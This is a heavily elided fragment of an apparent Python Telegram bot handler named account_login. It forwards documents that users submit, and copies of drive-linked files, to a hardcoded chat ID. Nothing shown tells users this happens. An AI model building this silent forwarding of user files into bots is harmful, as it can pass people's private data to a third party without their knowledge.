...
async def account_login(bot: Client, m: Message):
    ...
    if input.document:
        ...
        await bot.send_document(-1002036679367, x)
            ...
            try:
                ...
                if "drive" in url:
                    try:
                        ...
                        await copy.copy(chat_id = -1002036679367)
                        count+=1
                        os.remove(ka)
                        time.sleep(1)
